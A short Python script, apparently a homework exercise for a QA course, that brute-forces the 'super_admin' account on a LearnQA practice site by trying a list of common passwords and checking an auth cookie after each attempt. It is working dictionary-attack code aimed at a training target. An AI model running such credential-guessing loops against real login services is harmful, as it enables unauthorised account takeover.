import requests
password = [
    "password",
    "123456",
    "12345678",
    "abc123",
    "qwerty",
    "monkey",
    "letmein",
    "dragon",
    "111111",
    "baseball",
    "iloveyou",
    "trustno1",
    "1234567",
    "sunshine",
    "master",
    "123123",
    "welcome",
    "shadow",
    "ashley",
    "football",
    "jesus",
    "michael",
    "ninja",
    "mustang",
    "password1"
    ]
for i in password:
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
    data={"login": "super_admin", "password": i})
    response2 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie",
    cookies=dict(response1.cookies))
    if response2.text != "You are NOT authorized":
        print(response2.text)
        print(f'Пароль: {i}')
        break

